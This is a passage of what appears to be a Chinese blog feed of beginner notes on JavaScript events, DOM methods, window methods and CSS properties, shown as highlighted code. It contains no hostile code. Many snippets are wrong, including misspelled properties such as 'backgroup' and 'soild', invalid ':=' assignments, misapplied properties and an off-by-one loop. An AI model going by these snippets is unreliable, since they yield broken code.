language_">window</span>.<span class="property">onfocus</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//获得焦点</span></span><br></pre></td></tr></table></figure><h3 id="文档加载事件"><a href="#文档加载事件" class="headerlink" title="文档加载事件"></a>文档加载事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//一张页面或一幅图像完成加载</span></span><br></pre></td></tr></table></figure><h3 id="鼠标事件"><a href="#鼠标事件" class="headerlink" title="鼠标事件"></a>鼠标事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onmousedown</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//鼠标按钮被按下</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onmouseup</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//鼠标按钮被松开</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onmousemove</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//鼠标被移动</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onmouseover</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//鼠标移到某元素上</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onmouseout</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//鼠标从某元素移开</span></span><br></pre></td></tr></table></figure><h3 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onkeydown</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//键盘按键被按下</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onkeyup</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//键盘按键被松开</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onkeypress</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//键盘按键被按下并松开</span></span><br></pre></td></tr></table></figure><h3 id="选择和改变事件"><a href="#选择和改变事件" class="headerlink" title="选择和改变事件"></a>选择和改变事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onchange</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//域的内容被改变</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onselect</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//文本被选中</span></span><br></pre></td></tr></table></figure><h3 id="表单事件"><a href="#表单事件" class="headerlink" title="表单事件"></a>表单事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onsubmit</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//提交按钮被点击</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onreset</span>:=<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;<span class="comment">//重置按钮被点击</span></span><br></pre></td></tr></table></figure><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态DOM</span></span><br><span class="line"><span class="comment">// 获取id的事件源,获取单个对象</span></span><br><span class="line"> <span class="keyword">var</span> ida = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ids&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取标签 , 返回多个数组对象.</span></span><br><span class="line"> <span class="keyword">var</span> ida = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取class事件源 ,返回的是一个数组对象</span></span><br><span class="line"><span class="keyword">var</span> ida = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取name属性 , 返回的结果是数组</span></span><br><span class="line"><span class="keyword">var</span> ida = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;ids&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态DOM</span></span><br><span class="line"><span class="comment">//获取单个属性,返回的值是单个</span></span><br><span class="line"><span class="keyword">var</span> ida = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#ids&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取多个属性,返回的值是数组</span></span><br><span class="line"><span class="keyword">var</span> ida = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">arr.<span class="property">offsetXXX</span><span class="comment">//获取元素</span></span><br></pre></td></tr></table></figure><h1 id="window对象方法"><a href="#window对象方法" class="headerlink" title="window对象方法"></a>window对象方法</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>()<span class="comment">//提示框</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">confirm</span>()<span class="comment">//确认框true   false</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">prompt</span>()<span class="comment">//获取用户输入的信息</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>()<span class="comment">//按照指定的毫秒数后调用只调用一次 clearTimeout( )  停止</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>()<span class="comment">//按照指定的周期调用定时循环 clearInterval( )   停止</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//示例：</span></span><br><span class="line">&lt;script &gt;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">let</span> bak = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#dvs&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">const</span> colors = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;black&#x27;</span>, <span class="string">&#x27;pink&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">       bak.<span class="property">style</span>.<span class="property">backgroundColor</span>=colors[index]</span><br><span class="line">       index++</span><br><span class="line">       <span class="keyword">if</span>(index&gt;colors.<span class="property">length</span>)&#123;</span><br><span class="line">           index = <span class="number">0</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;,<span class="number">2000</span>)</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="子对象"><a href="#子对象" class="headerlink" title="子对象"></a>子对象</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//属性</span></span><br><span class="line"><span class="comment">//href设置或返回完整的 URL</span></span><br><span class="line">/方法</span><br><span class="line">页面跳转</span><br><span class="line">location.<span class="property">href</span>=<span class="string">&#x27;http://www.baidu.com&#x27;</span></span><br><span class="line">页面刷新</span><br><span class="line"><span class="title function_">reload</span>()<span class="variable constant_">F5</span></span><br><span class="line"><span class="title function_">reload</span>(<span class="literal">true</span>)<span class="variable constant_">CTRL</span>+<span class="variable constant_">F5</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="/2022/09/10/CSS/"/>
      <url>/2022/09/10/CSS/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h4 id="插入样式表"><a href="#插入样式表" class="headerlink" title="插入样式表"></a>插入样式表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;mystyle.css&quot;</span>&gt;</span>外部样式表</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>内部样式表</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color:sienna;margin-left:20px&quot;</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>内联样式</span><br><span class="line"></span><br><span class="line">Ps:优先级：内联样式&gt;内部样式&gt;外部样式&gt;浏览器默认样式</span><br></pre></td></tr></table></figure><h4 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#th</span>&#123;&#125;<span class="comment">/*1. ID选择器   选择 id=&#x27;th&#x27; 的元素 只生效一次*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="selector-class">.a</span>&#123;<span class="attribute">color</span>:red;&#125;     <span class="comment">/*2. 类选择器    选择 class=&#x27;a&#x27; 的元素 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">p</span><span class="selector-class">.a</span>&#123;<span class="attribute">color</span>:red&#125;<span class="comment">/*2.1 关联选择器，将a这个类应用到全部的p标签*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="selector-tag">h3</span>&#123;<span class="attribute">color</span>:red;&#125;     <span class="comment">/*3. 标签选择器    选择 标签名称是 h3 的元素*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="关系选择器"><a href="#关系选择器" class="headerlink" title="关系选择器"></a>关系选择器</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt; </span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span>&#123;<span class="attribute">color</span>:red;&#125; <span class="comment">/* 后代选择器 ul中的所有li 不管是儿子,还是孙子 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span>&#123;<span class="attribute">color</span>:green;&#125; <span class="comment">/* 父子选择器 ul中的li, 要求li是它的子级元素 选中abcdef */</span> </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span>+<span class="selector-tag">li</span>&#123;<span class="attribute">color</span>:blue;&#125; <span class="comment">/* 相邻选择器 ol后面的同级的li元素 选中 d */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">ol</span>~<span class="selector-tag">li</span>&#123;<span class="attribute">color</span>:gold;&#125; <span class="comment">/* 兄弟选择器 ol后面的所有li兄弟元素 选中 def */</span> </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h4 id="链接-x2F-伪类选择器"><a href="#链接-x2F-伪类选择器" class="headerlink" title="链接&#x2F;伪类选择器"></a>链接&#x2F;伪类选择器</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"> </span></span><br><span class="line"><span class="language-css"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span> &#123;<span class="attribute">color</span>:<span class="number">#000000</span>;&#125;        <span class="comment">/* 未访问链接*/</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">color</span>:<span class="number">#00FF00</span>;&#125;  <span class="comment">/* 已访问链接 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;<span class="attribute">color</span>:<span class="number">#FF00FF</span>;&#125;   <span class="comment">/* 鼠标移动到链接上 */</span></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;<span class="attribute">color</span>:<span class="number">#0000FF</span>;&#125;  <span class="comment">/* 鼠标点击时 */</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="背景backgroup"><a href="#背景backgroup" class="headerlink" title="背景backgroup"></a>背景backgroup</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">backgroup: soild <span class="number">1px</span> red <span class="number">1px</span> <span class="number">1px</span> fixed;<span class="comment">/*简写属性*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">backgroup-<span class="attribute">color</span>: red/<span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>)/<span class="number">#ff0000</span>;<span class="comment">/*背景颜色*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">backgroup-image: <span class="built_in">url</span>(<span class="string">&#x27;1.jpg&#x27;</span>);<span class="comment">/*背景图片*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">backgroup-repeat:no-repeat/repeat-x/repeat-y;<span class="comment">/*背景不填充/x轴填充/y轴填充*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">backgroup-attachment:scroll/fixed/local;<span class="comment">/*背景随页面滚动/不随页面滚动/随内容滚动*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">backgroup-<span class="attribute">position</span>:top/right/buttom/left;<span class="comment">/*背景图片的起始位置*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="文本格式"><a href="#文本格式" class="headerlink" title="文本格式"></a>文本格式</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">color</span>:red/<span class="number">#00ff00</span>/<span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">/*文本颜色、transparent为透明色*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">text-align</span>:center/right/justify/left;<span class="comment">/*文本居中/右对齐/两边对齐/左对齐*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">text-align</span>:overline/line-through/underline;<span class="comment">/*文本上划线/中划线/下划线*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">text-transform</span>:uppercase/lowercase/capitalize; <span class="comment">/*全部文本大写/小写/首字母大写*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">text-indent</span>:<span class="number">50px</span>;<span class="comment">/*文本第一行缩进50px*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">text-shadow</span>:<span class="number">5px</span> <span class="number">3px</span> <span class="number">4px</span> red;<span class="comment">/*文本x轴，y轴，模糊度，阴影颜色*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">line-height</span>:<span class="number">40px</span>；<span class="comment">/*行高*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">word-spacing:<span class="number">10px</span>;<span class="comment">/*单词词间距，对中文无效*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">letter-spacing</span>:<span class="number">10px</span>;<span class="comment">/*字符间距*/</span>    </span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">opacity</span>:<span class="number">0.5</span><span class="comment">/*不透明度,小于1*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">font-style</span>:normal/italic;<span class="comment">/*正常/斜体显示*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">font-size</span>:<span class="number">40px</span>/bold;<span class="comment">/*增大40px/加粗*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">font-family</span>:宋体/黑体;<span class="comment">/*设置字体*/</span> </span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">font-weight</span>:normal/bold/bolder/lighter;<span class="comment">/*默认大小/加粗字体/更粗/更细*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">list-style</span>:<span class="built_in">url</span>(<span class="string">&#x27;1.jpg&#x27;</span>) <span class="number">1px</span> <span class="number">1px</span> <span class="comment">/*简写属性。用于把所有用于列表的属性设置于一个声明中*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">list-style-image:<span class="built_in">url</span>(<span class="string">&#x27;1.jpg&#x27;</span>)<span class="comment">/*将图像设置为列表项标志。*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">list-style-position:inside/outside<span class="comment">/*设置列表中列表项标志的位置。*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css">list-style-type:<span class="comment">/*设置列表项标志的类型。*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>:soild <span class="number">1px</span> red;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border-style</span>:soild/doutted/dashed/double;<span class="comment">/*定义一个实线/电线/虚线/两个边框*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">border-width</span>:<span class="number">10px</span>;<span class="comment">/*边框线大小为10px*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">border-color</span>:red/<span class="built_in">rgb</span>(<span class="number">255.0</span>.<span class="number">0</span>)/<span class="number">#ff0000</span>;<span class="comment">/*定义边框颜色*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">border-style</span>/<span class="attribute">width</span>/<span class="attribute">color</span>/radius:soild/<span class="number">1px</span>/red/<span class="number">10px</span>;<span class="comment">/*设置边框的样式/宽度/颜色/圆角*/</span></span></span><br><span class="line"><span class="language-css">    </span></span><br><span class="line"><span class="language-css"><span class="attribute">margin</span>:<span class="number">0px</span> auto<span class="comment">/*边框居中*/</span></span></span><br><span class="line"><span class="language-css">margin-top/right/bottom/left:<span class="number">10px</span>;<span class="comment">/*边框下移/左移/上移/右移10px*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">padding-top</span>/<span class="attribute">right</span>/<span class="attribute">bottom</span>/<span class="attribute">left</span>:<span class="number">10px</span>;<span class="comment">/*内容在边框内下移/左移/上移/右移10px*/</span></span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="outline轮廓"><a href="#outline轮廓" class="headerlink" title="outline轮廓"></a>outline轮廓</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">outline</span>:soild <span class="number">1px</span> red;<span class="comment">/*设置一个1px的红色实线轮廓*/</span></span></span><br><span class="line"><span class="language-css"><span class="attribute">outline-color</span>:red/<span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>)/<span class="number">#ff0000</span>;<span class="comment">/*边框颜色*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">outline-style</span>:soild/dotted;<span class="comment">/*边框样式*/</span></span></span><br><span class="line"><span class="language-css">    <span class="attribute">outline-width</span>:<span class="number">10px</span>;<span class="comment">/*边框大小*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="attribute">overflow</span>:visible<span class="comment">/*默认值。内容不会被修剪，会呈现在元素框之外。*/</span></span></span><br><span class="line"><span class="language-css">overflow:hidden<span class="comment">/*内容会被修剪，并且其余内容是不可见的。*/</span></span></span><br><span class="line"><span class="language-css">overflow:scroll<span class="comment">/*内容会被修剪，但是浏览器会显示滚动条以便查看其余的内容。*/</span></span></span><br><span class="line"><span class="language-css">overflow:auto<span class="comment">/*如果内容被修剪，则浏览器会显示滚动条以便查看其余的内容。*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="display块和内联元素"><a href="#display块和内联元素" class="headerlink" title="display块和内联元素"></a>display块和内联元素</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">块元素：占用整行</span><br><span class="line">例如：<span class="tag">&lt;<span class="name">h1</span>&gt;</span>、<span class="tag">&lt;<span class="name">p</span>&gt;</span>、<span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">内联元素：只占用必要的宽度，不强制换行</span><br><span class="line">例如：<span class="tag">&lt;<span class="name">span</span>&gt;</span>、<span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">display显示元素，把块元素变成内联元素</span><br><span class="line">inline block inline-block none</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">li</span> &#123;<span class="attribute">display</span>:inline;&#125;<span class="comment">/*把列表项显示为内联元素*/</span></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">span</span> &#123;<span class="attribute">display</span>:block;&#125;<span class="comment">/*把span显示为块元素*/</span></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="position定位"><a href="#position定位" class="headerlink" title="position定位"></a>position定位</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span 